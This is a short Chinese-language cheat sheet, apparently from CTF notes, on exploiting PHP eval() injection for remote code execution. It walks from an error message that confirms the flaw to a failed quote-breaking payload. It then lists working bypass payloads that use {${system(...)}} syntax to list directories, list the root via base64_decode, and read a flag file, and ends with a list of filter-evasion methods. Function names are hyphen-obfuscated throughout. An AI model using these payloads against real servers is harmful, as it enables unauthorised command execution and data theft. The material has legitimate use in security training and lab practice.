```sh

RCE:
一个示例:

#输入单引号时报错:		#确认 RCE 漏洞
syntax error, unexpected ''();' (T_ENCAPSED_AND_WHITESPACE) in /var/www/html/common/function.php(20) : ev--al()'d code on line 1


#猜测后端代码类似:
ev--al("check('$user');");，

#尝试下面payload :
');sy--stem('ls');//
失败, 可知单引号 ' 被 addslashes()类似函数 给拦住或转义

#绕过单引号:
传入 {${phpinfo()}} 或  {${sys-tem(ls)}}
#说明: 当 PHP 解释器在双引号（或 ev--al 内部的包裹字符串）中遇到 ${} 时，它会先计算花括号内部表达式的值，然后再把结果作为变量名。


#其他
看当前目录：{${sys-tem(ls)}}
看根目录：{${sy-stem(base64_decode(Lw))}} (注：Lw 是 / 的 base64，避开引号)
读 Flag：{${sys-tem(cat.base64_decode(L2ZsYWc))}}
```



```sh
#需绕过:
1.特殊字符 	# ' " \ ()
2.空格 
3.函数 	 
#方式:
大小写, 双写, ascii, base64, urlencode, 16进制 等等..
```

